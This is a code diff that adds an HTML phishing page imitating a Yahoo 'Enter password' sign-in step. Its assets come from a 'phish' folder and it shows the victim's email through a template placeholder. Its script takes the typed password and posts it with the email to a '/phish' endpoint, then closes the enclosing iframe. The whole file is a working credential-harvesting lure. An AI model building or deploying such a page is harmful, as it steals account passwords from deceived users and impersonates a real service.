@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="../phish/style3.css">
+</head>
+<body>
+    <nav>
+        <img src="../phish/Yahoo.png" alt="" srcset="">
+        <a href="#">Help</a>
+    </nav>
+    <div class="card">
+        <img src="../phish/Yahoo.png" alt="" srcset="">
+        <div class="content">
+            <p class="mail-name">{{ email }}</p>
+            <h1>Enter password</h1>
+            <p><small>to finish signing in</small></p>
+            <input type="password" id="pass" type="text" placeholder="Password">
+            <button onclick="ola()" class="next">Next</button>
+            <a href="#">Forgotten password?</a>
+        </div>
+    </div>
+</body>
+<script>
+
+    function ola(){
+        const email  = document.getElementsByClassName("mail-name")[0].innerText; 
+        const pass = document.getElementById("pass").value;
+        $.post("/phish", {"email": email, "password": pass})
+        if (parent != undefined){
+            parent.closeIFrame();
+        }
+        
+          }
+
+</script>
+
+</html>
